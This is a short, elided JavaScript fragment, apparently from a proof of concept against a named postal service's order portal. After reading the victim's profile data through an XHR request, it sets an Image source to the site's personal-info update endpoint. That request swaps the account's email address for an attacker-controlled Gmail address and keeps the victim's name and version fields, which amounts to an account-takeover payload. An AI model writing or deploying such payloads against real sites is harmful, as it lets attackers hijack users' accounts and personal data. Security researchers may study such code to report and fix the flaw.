...
xhr.onreadystatechange = function () {
    ...
    if (xhr.readyState === 4) {
        ...
        if (xhr.status === 200) {
            ...
            const newemail = "attacker.emailxxxxx"+random+"@gmail.com";
            const img = new Image();
...
img.src = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=${object_version_number}&email_address=${newemail}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&password=&vpassword=&email_object_version_number=${email_object_version_number}`;
        } else {
